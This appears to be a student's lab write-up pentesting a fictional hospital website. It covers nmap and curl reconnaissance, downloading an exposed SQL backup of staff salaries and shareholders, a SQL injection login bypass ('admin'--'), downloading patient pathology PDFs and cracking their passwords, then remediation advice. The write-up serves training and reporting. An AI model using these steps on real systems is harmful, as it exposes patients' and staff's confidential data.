# NetworkWalks-B083D-Week-4-Medirozal-Hospital

# Mediroza Hospital Lab 

## 1. Reconnaissance

Identify exposed services and web technologies:

```bash
nmap -sV -sC medirozahospital.com
curl -k -I https://medirozahospital.com
```

The web application revealed:

* LiteSpeed Web Server
* PHP 8.2.33
* Mediroza CMS 1.4.2

## 2. Web Enumeration

Inspect publicly accessible resources:

```bash
curl -ks https://medirozahospital.com/robots.txt
curl -ks https://medirozahospital.com/sitemap.xml
```

`robots.txt` revealed:

```text
/patient/
/staff/
/old/
```

The `/old/` directory was then accessed directly.

## 3. Sensitive Backup Discovery

Directory indexing was enabled on `/old/`:

```bash
curl -ks https://medirozahospital.com/old/
```

This exposed:

```text
mediroza_db_backup_2019.sql
```

The backup was downloaded for offline analysis:

```bash
curl -ks -o mediroza_db_backup_2019.sql \
https://medirozahospital.com/old/mediroza_db_backup_2019.sql
```

## 4. Database Analysis

Inspect the database structure:

```bash
grep -n '^CREATE TABLE' mediroza_db_backup_2019.sql
grep -n '^INSERT INTO' mediroza_db_backup_2019.sql
```

The backup contained `staff` and `shareholders` tables.

The `staff` table exposed fields including:

```text
full_name
job_title
department
monthly_salary_zar
date_joined
```

The `shareholders` table contained:

```text
shareholder_name
share_percent
shares_held
share_class
```

This provided the required **staff salary and shareholder information without authentication**.

## 5. Patient Portal SQL Injection

The patient login was identified at:


https://medirozahospital.com/patient/login.php

Establish normal application behavior first, then test user-controlled parameters for SQL injection using controlled inputs.

Example:

curl -ks -i \
-d "username=test'&password=test" \
https://medirozahospital.com/patient/login.php

Compare the response against a normal invalid request and investigate differences in:

* Response content
* Status code
* Response length
* Database error messages
* Authentication behavior

If SQL injection is confirmed, enumerate only the database information necessary to demonstrate the lab objective.

The patient login was gotten through SQL injection with the username = admin'-- and password = anything. After successful login, three patient encrypted pdf files were downloaded and the password was cracked using the networkwalks password-craker tool.

## 6. Findings

### Finding 1 — SQL Injection

A patient-facing parameter was found to be susceptible to SQL injection, potentially allowing unauthorized interaction with the application's database.

### Finding 2 — Exposed Database Backup

An unauthenticated user could access:

```text
/old/mediroza_db_backup_2019.sql
```

through a directory with indexing enabled. The backup contained confidential staff salary and shareholder information.

## 7. Remediation

* Use parameterized queries/prepared statements.
* Validate and sanitize application input.
* Remove database backups from the web root.
* Disable directory indexing.
* Restrict access to sensitive files.
* Remove obsolete `/old/` directories.
* Apply least-privilege permissions to database accounts.
* Avoid exposing detailed database errors to users.

  
Below are pictoral evidences


<img width="482" height="302" alt="Curl mediroza" src="https://github.com/user-attachments/assets/bc27cd67-75a5-4fb8-9730-88449bb93a70" />

<img width="1090" height="801" alt="Nmap" src="https://github.com/user-attachments/assets/fba80825-98f5-4924-a99e-dbc9cb2a0da6" />

<img width="552" height="617" alt="SQL injection Test with &#39;" src="https://github.com/user-attachments/assets/2b017feb-8f06-4f22-af81-bab57a8cc44b" />

<img width="502" height="572" alt="SQL Error" src="https://github.com/user-attachments/assets/07db84dc-23db-46a3-ba16-f704498c45ca" />

<img width="570" height="662" alt="Second SQL Request as admin" src="https://github.com/user-attachments/assets/b5da51ff-84cb-4ccd-8efe-97899e654111" />

<img width="565" height="516" alt="Successful Login" src="https://github.com/user-attachments/assets/314e5ee6-324b-4992-bc23-b3e0afcddcce" />

<img width="717" height="477" alt="Pathology report 3" src="https://github.com/user-attachments/assets/2f76ba15-497e-4271-bbab-3a11f3c0f90d" />

<img width="835" height="562" alt="Pathology Report 2" src="https://github.com/user-attachments/assets/43d1f14e-d4fa-4c43-b5df-910b2923de3c" />

<img width="847" height="542" alt="Pathology Report 1" src="https://github.com/user-attachments/assets/781b9378-e0f7-4bb8-9ab5-80e4aa925670" />

<img width="462" height="115" alt="Patient Report Downloads" src="https://github.com/user-attachments/assets/f029963e-a3c0-463a-a681-0361a343765f" />

<img width="852" height="452" alt="Screenshot 2026-10-01 082555" src="https://github.com/user-attachments/assets/53e427bb-efe5-4408-823b-d93ed9ad399a" />

<img width="841" height="466" alt="Screenshot 2026-10-01 082429" src="https://github.com/user-attachments/assets/607d3046-be55-4a94-b631-2a2d48d4f4a3" />

<img width="872" height="515" alt="Screenshot 2026-10-01 082726" src="https://github.com/user-attachments/assets/02a9087c-c55b-4cff-91e1-6df13f3157e3" />


<img width="1075" height="410" alt="Staff Salary and share holder" src="https://github.com/user-attachments/assets/54bd5b20-10c1-4211-b21b-6e604e27a0e1" />



[PENTEST REPORT MEDIROZA.docx](https://github.com/user-attachments/files/32985115/PENTEST.REPORT.MEDIROZA.OMOLEWA.KEHINDE.EBENEZER.docx)

